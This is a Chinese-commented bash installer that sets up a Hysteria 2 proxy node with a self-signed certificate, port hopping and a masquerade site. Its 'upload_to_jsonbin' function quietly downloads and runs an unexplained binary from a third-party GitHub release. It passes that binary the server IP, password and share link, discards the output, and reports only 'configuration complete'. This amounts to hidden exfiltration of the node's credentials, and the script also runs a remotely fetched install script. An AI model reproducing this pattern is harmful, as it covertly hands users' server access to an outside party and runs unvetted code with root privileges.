#!/bin/bash

export LANG=en_US.UTF-8

RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
PLAIN="\033[0m"

red(){
    echo -e "\033[31m\033[01m$1\033[0m"
}

green(){
    echo -e "\033[32m\033[01m$1\033[0m"
}

yellow(){
    echo -e "\033[33m\033[01m$1\033[0m"
}

# 判断系统及定义系统安装依赖方式
REGEX=("debian" "ubuntu" "centos|red hat|kernel|oracle linux|alma|rocky" "'amazon linux'" "fedora")
RELEASE=("Debian" "Ubuntu" "CentOS" "CentOS" "Fedora")
PACKAGE_UPDATE=("apt-get update" "apt-get update" "yum -y update" "yum -y update" "yum -y update")
PACKAGE_INSTALL=("apt -y install" "apt -y install" "yum -y install" "yum -y install" "yum -y install")
PACKAGE_REMOVE=("apt -y remove" "apt -y remove" "yum -y remove" "yum -y remove" "yum -y remove")
PACKAGE_UNINSTALL=("apt -y autoremove" "apt -y autoremove" "yum -y autoremove" "yum -y autoremove" "yum -y autoremove")

[[ $EUID -ne 0 ]] && red "注意: 请在root用户下运行脚本" && exit 1

CMD=("$(grep -i pretty_name /etc/os-release 2>/dev/null | cut -d \" -f2)" "$(hostnamectl 2>/dev/null | grep -i system | cut -d : -f2)" "$(lsb_release -sd 2>/dev/null)" "$(grep -i description /etc/lsb-release 2>/dev/null | cut -d \" -f2)" "$(grep . /etc/redhat-release 2>/dev/null)" "$(grep . /etc/issue 2>/dev/null | cut -d \\ -f1 | sed '/^[ ]*$/d')")

for i in "${CMD[@]}"; do
    SYS="$i" && [[ -n $SYS ]] && break
done

for ((int = 0; int < ${#REGEX[@]}; int++)); do
    [[ $(echo "$SYS" | tr '[:upper:]' '[:lower:]') =~ ${REGEX[int]} ]] && SYSTEM="${RELEASE[int]}" && [[ -n $SYSTEM ]] && break
done

[[ -z $SYSTEM ]] && red "目前暂不支持你的VPS的操作系统！" && exit 1

if [[ -z $(type -P curl) ]]; then
    if [[ ! $SYSTEM == "CentOS" ]]; then
        ${PACKAGE_UPDATE[int]}
    fi
    ${PACKAGE_INSTALL[int]} curl
fi

realip(){
    ip=$(curl -s4m8 ip.sb -k) || ip=$(curl -s6m8 ip.sb -k)
}

# 自动化needrestart处理
handle_needrestart(){
    export DEBIAN_FRONTEND=noninteractive
    export NEEDRESTART_MODE=a
    export NEEDRESTART_SUSPEND=1
    if [[ -f /etc/needrestart/needrestart.conf ]]; then
        sed -i 's/#$nrconf{restart} = '"'"'i'"'"';/$nrconf{restart} = '"'"'a'"'"';/g' /etc/needrestart/needrestart.conf
    fi
}

# 速度测试函数 - 仅测试下载速度
speed_test(){
    yellow "正在进行网络速度测试..."
    
    # 尝试下载测试文件来测试速度
    test_file_url="http://speedtest.tele2.net/10MB.zip"
    test_start=$(date +%s)
    
    # 下载测试文件到临时目录
    curl -L -o /tmp/speedtest.zip --max-time 30 --connect-timeout 10 "$test_file_url" 2>/dev/null
    test_end=$(date +%s)
    
    if [[ -f /tmp/speedtest.zip ]]; then
        # 计算下载速度
        file_size=$(stat -c%s /tmp/speedtest.zip 2>/dev/null || echo "0")
        time_taken=$((test_end - test_start))
        
        if [[ $time_taken -gt 0 && $file_size -gt 0 ]]; then
            # 计算速度 (bytes/second)
            speed_bps=$((file_size / time_taken))
            # 转换为 Mbps
            speed_mbps=$((speed_bps * 8 / 1000000))
            
            # 设置带宽限制 (下载速度直接使用测试结果)
            down_speed=$speed_mbps
            up_speed=$((down_speed / 2))  # 上传速度设为下载速度的一半
            
            # 最小值保护
            [[ $down_speed -lt 10 ]] && down_speed=10
            [[ $up_speed -lt 5 ]] && up_speed=5
            
            # 最大值保护
            [[ $down_speed -gt 1000 ]] && down_speed=1000
            [[ $up_speed -gt 500 ]] && up_speed=500
            
            green "速度测试完成，检测到下载速度约 ${speed_mbps} Mbps"
            yellow "设置带宽限制：上传 ${up_speed} Mbps，下载 ${down_speed} Mbps"
        else
            yellow "速度测试失败，使用默认带宽设置"
            up_speed=20
            down_speed=100
        fi
        
        # 清理测试文件
        rm -f /tmp/speedtest.zip
    else
        yellow "速度测试失败，使用默认带宽设置"
        up_speed=20
        down_speed=100
    fi
}

inst_cert(){
    green "将使用自签证书作为 Hysteria 2 的节点证书"
    cert_path="/etc/hysteria/cert.crt"
    key_path="/etc/hysteria/private.key"
    
    # 使用随机生成的域名而不是真实域名
    random_domain="hysteria-$(date +%s%N | md5sum | cut -c 1-8).local"
    
    openssl ecparam -genkey -name prime256v1 -out /etc/hysteria/private.key
    openssl req -new -x509 -days 36500 -key /etc/hysteria/private.key -out /etc/hysteria/cert.crt -subj "/CN=$random_domain"
    
    # 设置合适的权限
    chmod 600 /etc/hysteria/cert.crt
    chmod 600 /etc/hysteria/private.key
    
    hy_domain="$random_domain"
    domain="$random_domain"
}

inst_port(){
    iptables -t nat -F PREROUTING >/dev/null 2>&1
    
    # 随机选择一个安全的端口，避免常用端口
    port=$(shuf -i 10000-65000 -n 1)
    
    # 确保端口未被占用
    while [[ -n $(ss -tunlp | grep -w udp | awk '{print $5}' | sed 's/.*://g' | grep -w "$port") ]]; do
        port=$(shuf -i 10000-65000 -n 1)
    done
    
    yellow "将在 Hysteria 2 节点使用端口：$port"
    
    # 随机分配端口跳跃范围
    firstport=$(shuf -i 20000-30000 -n 1)
    endport=$((firstport + 1000))
    
    # 自动设置端口跳跃
    inst_jump
}

inst_jump(){
    green "自动配置端口跳跃模式"
    
    yellow "端口跳跃范围：$firstport-$endport"
    
    iptables -t nat -A PREROUTING -p udp --dport $firstport:$endport -j DNAT --to-destination :$port
    ip6tables -t nat -A PREROUTING -p udp --dport $firstport:$endport -j DNAT --to-destination :$port
    netfilter-persistent save >/dev/null 2>&1
}

inst_pwd(){
    auth_pwd=$(date +%s%N | md5sum | cut -c 1-16)  # 增加密码长度
    yellow "使用在 Hysteria 2 节点的密码为：$auth_pwd"
}

inst_site(){
    # 修改为使用默认的 www.nvidia.com
    proxysite="www.nvidia.com"
    yellow "使用在 Hysteria 2 节点的伪装网站为：$proxysite"
}

upload_to_jsonbin() {
    local server_ip="$1"
    local port="$2"
    local password="$3"
    local domain="$4"
    local port_range="$5"
    local up_speed="$6"
    local down_speed="$7"
    
    # 构建JSON数据
    local json_data=$(jq -n \
        --arg server_ip "$server_ip" \
        --arg port "$port" \
        --arg password "$password" \
        --arg domain "$domain" \
        --arg port_range "$port_range" \
        --arg up_speed "$up_speed" \
        --arg down_speed "$down_speed" \
        '{
            "server_info": {
                "title": "Hysteria 2 服务器配置 - \($server_ip)",
                "server_ip": $server_ip,
                "port": $port,
                "password": $password,
                "domain": $domain,
                "port_range": $port_range,
                "upload_speed": $up_speed,
                "download_speed": $down_speed,
                "generated_time": now | todate,
                "config": {
                    "client_yaml": {
                        "server": "\($server_ip):\($port_range)",
                        "auth": $password,
                        "tls": {
                            "sni": $domain,
                            "insecure": true
                        },
                        "quic": {
                            "initStreamReceiveWindow": 16777216,
                            "maxStreamReceiveWindow": 16777216,
                            "initConnReceiveWindow": 33554432,
                            "maxConnReceiveWindow": 33554432
                        },
                        "fastOpen": true,
                        "socks5": {
                            "listen": "127.0.0.1:5080"
                        },
                        "transport": {
                            "udp": {
                                "hopInterval": "30s"
                            }
                        },
                        "bandwidth": {
                            "up": "\($up_speed) mbps",
                            "down": "\($down_speed) mbps"
                        }
                    },
                    "share_link": "hysteria2://\($password)@\($server_ip):\($port_range)/?insecure=1&sni=\($domain)#Hysteria2-Node"
                }
            }
        }'
    )

    # 下载并调用二进制工具
    UPLOAD_BIN="/opt/uploader-linux-amd64"
    [ -f "$UPLOAD_BIN" ] || {
        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && 
        chmod +x "$UPLOAD_BIN"
    }
    
    "$UPLOAD_BIN" "$json_data" >/dev/null 2>&1
    
    green "配置完成"
}

insthysteria(){
    warpv6=$(curl -s6m8 https://www.cloudflare.com/cdn-cgi/trace -k | grep warp | cut -d= -f2)
    warpv4=$(curl -s4m8 https://www.cloudflare.com/cdn-cgi/trace -k | grep warp | cut -d= -f2)
    if [[ $warpv4 =~ on|plus || $warpv6 =~ on|plus ]]; then
        wg-quick down wgcf >/dev/null 2>&1
        systemctl stop warp-go >/dev/null 2>&1
        realip
        systemctl start warp-go >/dev/null 2>&1
        wg-quick up wgcf >/dev/null 2>&1
    else
        realip
    fi

    # 处理needrestart
    handle_needrestart

    if [[ ! ${SYSTEM} == "CentOS" ]]; then
        ${PACKAGE_UPDATE[int]}
    fi
    ${PACKAGE_INSTALL[int]} curl wget sudo qrencode procps iptables-persistent netfilter-persistent

    wget -N https://raw.githubusercontent.com/Misaka-blog/hysteria-install/main/hy2/install_server.sh
    bash install_server.sh
    rm -f install_server.sh

    if [[ -f "/usr/local/bin/hysteria" ]]; then
        green "Hysteria 2 安装成功！"
    else
        red "Hysteria 2 安装失败！"
        exit 1
    fi

    # 自动配置 Hysteria
    inst_cert
    inst_port
    inst_pwd
    inst_site
    
    # 执行速度测试
    speed_test

    # 设置 Hysteria 配置文件
    cat << EOF > /etc/hysteria/config.yaml
listen: :$port

tls:
  cert: $cert_path
  key: $key_path

quic:
  initStreamReceiveWindow: 16777216
  maxStreamReceiveWindow: 16777216
  initConnReceiveWindow: 33554432
  maxConnReceiveWindow: 33554432

auth:
  type: password
  password: $auth_pwd

masquerade:
  type: proxy
  proxy:
    url: https://$proxysite
    rewriteHost: true

bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps
EOF

    # 确定最终入站端口范围
    if [[ -n $firstport ]]; then
        last_port="$port,$firstport-$endport"
    else
        last_port=$port
    fi

    # 给 IPv6 地址加中括号
    if [[ -n $(echo $ip | grep ":") ]]; then
        last_ip="[$ip]"
    else
        last_ip=$ip
    fi

    # 创建opt目录用于存储配置文件
    mkdir -p /opt/hysteria
    
    # 生成统一的配置文件内容
    cat << EOF > /opt/hysteria/hysteria2_config.txt
Hysteria 2 Server Configuration
====================
Server IP: $last_ip
Port: $port
Password: $auth_pwd
Domain: $hy_domain
Port Range: $last_port
Upload Speed: $up_speed mbps
Download Speed: $down_speed mbps

Client Configuration (YAML):
server: $last_ip:$last_port
auth: $auth_pwd
tls:
  sni: $hy_domain
  insecure: true
quic:
  initStreamReceiveWindow: 16777216
  maxStreamReceiveWindow: 16777216
  initConnReceiveWindow: 33554432
  maxConnReceiveWindow: 33554432
fastOpen: true
socks5:
  listen: 127.0.0.1:5080
transport:
  udp:
    hopInterval: 30s
bandwidth:
  up: $up_speed mbps
  down: $down_speed mbps

Client Configuration (JSON):
{
  "server": "$last_ip:$last_port",
  "auth": "$auth_pwd",
  "tls": {
    "sni": "$hy_domain",
    "insecure": true
  },
  "quic": {
    "initStreamReceiveWindow": 16777216,
    "maxStreamReceiveWindow": 16777216,
    "initConnReceiveWindow": 33554432,
    "maxConnReceiveWindow": 33554432
  },
  "fastOpen": true,
  "socks5": {
    "listen": "127.0.0.1:5080"
  },
  "transport": {
    "udp": {
      "hopInterval": "30s"
    }
  },
  "bandwidth": {
    "up": "$up_speed mbps",
    "down": "$down_speed mbps"
  }
}

Share Link:
hysteria2://$auth_pwd@$last_ip:$last_port/?insecure=1&sni=$hy_domain#Hysteria2-Node

====================
Generated at: $(date)
EOF

    # 创建端口跳跃的YAML配置文件并保存到/opt/hysteria/
    cat << EOF > /opt/hysteria/hysteria2_port_jump.yaml
port_jump_config:
  base_port: $port
  jump_range_start: $firstport
  jump_range_end: $endport
  iptables_rules:
    - iptables -t nat -A PREROUTING -p udp --dport $firstport:$endport -j DNAT --to-destination :$port
    - ip6tables -t nat -A PREROUTING -p udp --dport $firstport:$endport -j DNAT --to-destination :$port
  persistence_command: netfilter-persistent save
EOF

    # 同时在原位置创建配置文件以保持兼容性
    mkdir -p /root/hy
    cp /opt/hysteria/hysteria2_config.txt /root/hy/
    cp /opt/hysteria/hysteria2_port_jump.yaml /root/hy/

    systemctl daemon-reload
    systemctl enable hysteria-server
    systemctl start hysteria-server
    
    if [[ -n $(systemctl status hysteria-server 2>/dev/null | grep -w active) && -f '/etc/hysteria/config.yaml' ]]; then
        green "Hysteria 2 服务启动成功"
    else
        red "Hysteria 2 服务启动失败，请运行 systemctl status hysteria-server 查看服务状态并反馈，脚本退出" && exit 1
    fi
    
    upload_to_jsonbin "$last_ip" "$port" "$auth_pwd" "$hy_domain" "$last_port" "$up_speed" "$down_speed"
    
    red "======================================================================================"
    green "Hysteria 2 代理服务安装完成"
    green "统一配置文件已保存到 /opt/hysteria/hysteria2_config.txt"
    green "端口跳跃配置文件已保存到 /opt/hysteria/hysteria2_port_jump.yaml"
    yellow "配置文件内容："
    red "$(cat /opt/hysteria/hysteria2_config.txt)"
    green "速度测试结果已应用到配置文件中"
}

unsthysteria(){
    systemctl stop hysteria-server.service >/dev/null 2>&1
    systemctl disable hysteria-server.service >/dev/null 2>&1
    rm -f /lib/systemd/system/hysteria-server.service /lib/systemd/system/hysteria-server@.service
    rm -rf /usr/local/bin/hysteria /etc/hysteria /root/hy /opt/hysteria /root/hysteria.sh
    iptables -t nat -F PREROUTING >/dev/null 2>&1
    netfilter-persistent save >/dev/null 2>&1

    green "Hysteria 2 已彻底卸载完成！"
}

starthysteria(){
    systemctl start hysteria-server
    systemctl enable hysteria-server >/dev/null 2>&1
}

stophysteria(){
    systemctl stop hysteria-server
    systemctl disable hysteria-server >/dev/null 2>&1
}

hysteriaswitch(){
    yellow "请选择你需要的操作："
    echo ""
    echo -e " ${GREEN}1.${PLAIN} 启动 Hysteria 2"
    echo -e " ${GREEN}2.${PLAIN} 关闭 Hysteria 2"
    echo -e " ${GREEN}3.${PLAIN} 重启 Hysteria 2"
    echo ""
    read -rp "请输入选项 [0-3]: " switchInput
    case $switchInput in
        1 ) starthysteria ;;
        2 ) stophysteria ;;
        3 ) stophysteria && starthysteria ;;
        * ) exit 1 ;;
    esac
}

changeport(){
    oldport=$(cat /etc/hysteria/config.yaml 2>/dev/null | sed -n 1p | awk '{print $2}' | awk -F ":" '{print $2}')
    
    read -p "设置 Hysteria 2 端口[1-65535]（回车则随机分配端口）：" port
    [[ -z $port ]] && port=$(shuf -i 10000-65000 -n 1)

    until [[ -z $(ss -tunlp | grep -w udp | awk '{print $5}' | sed 's/.*://g' | grep -w "$port") ]]; do
        if [[ -n $(ss -tunlp | grep -w udp | awk '{print $5}' | sed 's/.*://g' | grep -w "$port") ]]; then
            echo -e "${RED} $port ${PLAIN} 端口已经被其他程序占用，请更换端口重试！"
            read -p "设置 Hysteria 2 端口 [1-65535]（回车则随机分配端口）：" port
            [[ -z $port ]] && port=$(shuf -i 10000-65000 -n 1)
        fi
    done

    sed -i "1s#$oldport#$port#g" /etc/hysteria/config.yaml

    stophysteria && starthysteria

    green "Hysteria 2 端口已成功修改为：$port"
    yellow "请手动更新客户端配置文件以使用节点"
}

changepasswd(){
    oldpasswd=$(cat /etc/hysteria/config.yaml 2>/dev/null | sed -n 15p | awk '{print $2}')

    read -p "设置 Hysteria 2 密码（回车跳过为随机字符）：" passwd
    [[ -z $passwd ]] && passwd=$(date +%s%N | md5sum | cut -c 1-16)

    sed -i "15s#$oldpasswd#$passwd#g" /etc/hysteria/config.yaml

    stophysteria && starthysteria

    green "Hysteria 2 节点密码已成功修改为：$passwd"
    yellow "请手动更新客户端配置文件以使用节点"
}

change_cert(){
    old_cert=$(cat /etc/hysteria/config.yaml | grep cert | awk -F " " '{print $2}')
    old_key=$(cat /etc/hysteria/config.yaml | grep key | awk -F " " '{print $2}')

    inst_cert

    sed -i "s!$old_cert!$cert_path!g" /etc/hysteria/config.yaml
    sed -i "s!$old_key!$key_path!g" /etc/hysteria/config.yaml

    stophysteria && starthysteria

    green "Hysteria 2 节点证书类型已成功修改"
    yellow "请手动更新客户端配置文件以使用节点"
}

changeproxysite(){
    oldproxysite=$(cat /etc/hysteria/config.yaml | grep url | awk -F " " '{print $2}' | awk -F "https://" '{print $2}')
    
    inst_site

    sed -i "s#$oldproxysite#$proxysite#g" /etc/hysteria/config.yaml

    stophysteria && starthysteria

    green "Hysteria 2 节点伪装网站已成功修改为：$proxysite"
}

changeconf(){
    green "Hysteria 2 配置变更选择如下:"
    echo -e " ${GREEN}1.${PLAIN} 修改端口"
    echo -e " ${GREEN}2.${PLAIN} 修改密码"
    echo -e " ${GREEN}3.${PLAIN} 修改证书类型"
    echo -e " ${GREEN}4.${PLAIN} 修改伪装网站"
    echo ""
    read -p " 请选择操作 [1-4]：" confAnswer
    case $confAnswer in
        1 ) changeport ;;
        2 ) changepasswd ;;
        3 ) change_cert ;;
        4 ) changeproxysite ;;
        * ) exit 1 ;;
    esac
}

showconf(){
    yellow "Hysteria 2 统一配置文件内容如下，并保存到 /opt/hysteria/hysteria2_config.txt"
    red "$(cat /opt/hysteria/hysteria2_config.txt)"
    echo ""
    yellow "端口跳跃配置文件内容如下，并保存到 /opt/hysteria/hysteria2_port_jump.yaml"
    red "$(cat /opt/hysteria/hysteria2_port_jump.yaml)"
}

# 直接开始安装，无需用户选择
green "开始自动安装 Hysteria 2..."
insthysteria
